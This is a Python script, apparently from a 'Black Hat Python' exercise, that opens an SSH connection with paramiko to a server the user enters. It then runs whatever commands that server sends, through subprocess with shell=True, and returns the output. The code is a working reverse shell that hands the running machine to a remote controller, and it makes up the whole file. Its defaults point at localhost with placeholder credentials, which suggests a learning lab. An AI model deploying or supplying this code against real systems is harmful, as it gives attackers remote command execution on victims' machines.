import os
import paramiko
import shlex
import subprocess

# Note: run ssh-keygen to create a key with the name test_rsa.key

def ssh_command(ip, port, user, command, password, key_file):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if password:
      client.connect(ip, port=port, username=user, password=password)
    elif key_file:
      client.connect(ip, port=port, username=user, key_filename=key_file)
    else:
      raise RuntimeError("Neither password or key file was provided")

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
      ssh_session.send(command)

    print(ssh_session.recv(1024).decode())
    while True:
      command = ssh_session.recv(1024)
      try:
        cmd = command.decode()
        if cmd == 'exit':
          client.close()
          break
        cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
        ssh_session.send(cmd_output or 'okay')
      except Exception as e:
        ssh_session.send(str(e))
    client.close()
    

if __name__ == "__main__":
    user = input("Username: ") or "tim"
    password = input("Password (leave empty to use keyfile): ") or "sekret"
    if not password:
      key_file = input("Path to keyfile: ") or "./BlackHatPython.pem"

      if not os.path.exists(key_file):
        raise ValueError(f"Key file {key_file} does not exist")
    else:
      key_file = None;  
    

    ip = input("Enter server IP: ") or "127.0.0.1"
    port = input('Port: ') or 2222
    # cmd = input('Command: ') or 'id'
    ssh_command(ip, port, user, 'ClientConnected', password, key_file)
    